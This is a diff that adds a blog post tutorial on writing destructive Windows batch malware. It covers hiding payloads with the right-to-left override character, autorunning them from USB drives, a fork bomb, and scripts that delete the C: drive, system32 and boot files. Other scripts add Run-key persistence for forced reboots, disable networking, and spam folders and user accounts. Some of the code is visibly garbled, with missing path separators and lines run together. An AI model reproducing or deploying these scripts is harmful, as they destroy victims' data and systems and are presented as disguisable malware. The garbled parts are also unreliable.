@@ -1,0 +1,159 @@
+---
+layout: post
+title: creating batch malware under windows
+author: "Adm1n"
+tags:
+- tutorial
+- windows
+- batch
+- offsec
+---
+
+<p>so yes, it is known that m$ windows is a big security and privacy hole. </p>
+
+<p>for the first thing i can say about a unicode character which can reverse order of characters (including filenames or window titles). yes im now saying about this char: U+202e 
+<button onclick="navigator.clipboard.writeText('\u202e');">copy</button> here we can use it to spoof filetype and filename
+</p>
+
+<p> also to automatically run viruses (or other apps) from usb drive you should create this file named autorun.inf :
+
+<pre>
+<code>
+[autorun]
+open=file.bat
+icon=something.ico
+</code>
+</pre>
+
+<p> after that if virus was made on pendrive/usb hdd - it will run automatically after windows see drive (internal hdd unsupported)</p>
+ 
+<p> so yes, now we know some basics to hide a batch virus, let's start writing in batch (file.bat):</p>
+
+<p> first virus (most easy, you can make it in less than 2 minutes !!! ). it clones itself forever as a process until hardware limits it (and shuts down PC). also known as DoS attack or fork bomb, code: </p>
+
+<pre>
+<code> 
+%0|%0 
+</code>
+</pre>
+
+<p> simple, isnt it? , so we go to other ones:</p>
+
+<p> next virus - removes all files on C drive (will take about 5 minutes to write) : </p>
+
+<pre>
+<code>
+del C:\\*.* /f /s /q
+shutdown -f -t 00
+</code>
+</pre>
+
+<p> okay, next one - blocks turning on windows/immediate shutdown (about 15 minutes to write) : </p>
+
+<pre>
+<code>
+echo @echo off>c:windowshartlell.bat
+echo break off>>c:windowshartlell.bat
+echo shutdown -r -t 11 -f>>c:windowshartlell.bat
+echo end>>c:windowshartlell.bat
+reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v startAPI /t reg_sz /d c:windowshartlell.bat /f
+reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v /t reg_sz /d c:windowshartlell.bat /f
+PAUSE
+</code>
+</pre>
+
+<p> next one... removes system32 folder (3-4 minutes to write) : </p>
+
+<pre>
+<code>
+del C:\\windows\system32
+</code>
+</pre>
+
+<p> endless application opener (works similar to <code>%0|%0</code> ): </p>
+
+<pre>
+<code>
+:first
+START C:\\{application path}
+GOTO first
+</code>
+</pre>
+
+<p> another one for permanent shutdown, uses another method tho cause it removes boot (will take you 15 minutes to write): </p>
+
+<pre>
+<code>
+attrib -r -s -h c:autoexec.bat
+del c:autoexec.bat
+attrib -r -s -h c:boot.ini
+del c:boot.ini
+attrib -r -s -h c:ntldr
+del c:ntldr
+attrib -r -s -h c:windowswin.ini
+del c:windowswin.ini
+</code>
+</pre>
+
+<p> formatting c drive (2 minutes to write) : </p>
+
+<pre>
+<code>
+rd/s/q C:
+</code>
+</pre>
+
+<p> temporary wifi shutdown (can be reverted using some more knowledge, writable in 3 minutes) : <p>
+
+<pre>
+<code>
+ipconfig /release
+</code>
+</pre>
+
+<p> another script that turns wifi off, just that not revertible - deletes network drivers (10 minutes to write) : </p>
+
+<pre>
+<code>
+echo @echo off>c:windowswimn32.bat
+echo break off>c:windowswimn32.bat echo
+ipconfig/release_all>c:windowswimn32.bat
+echo end>c:windowswimn32.batreg add
+hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /freg add
+hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /fecho You Have Been HACKED!
+PAUSE
+</code>
+</pre>
+
+<p> infinite random folder creation (3 minutes to write) : </p>
+
+<pre>
+<code>
+:first
+md %random%
+goto first
+</code>
+</pre>
+
+<p> infinite random user accounts (also writing 3 minutes) : </p>
+
+<pre>
+<code>
+:first
+net user %random%
+goto first
+</code>
+</pre>
+
+<p> this one spams with new folders (writing about 5 minutes) : </p>
+
+<pre>
+<code>
+:first
+md x
+cd x
+goto first
+</code>
+</pre>
+
+<p> PS: i hope noone yet ran these malware :'D  cause these ones were REAL viruses...</p>
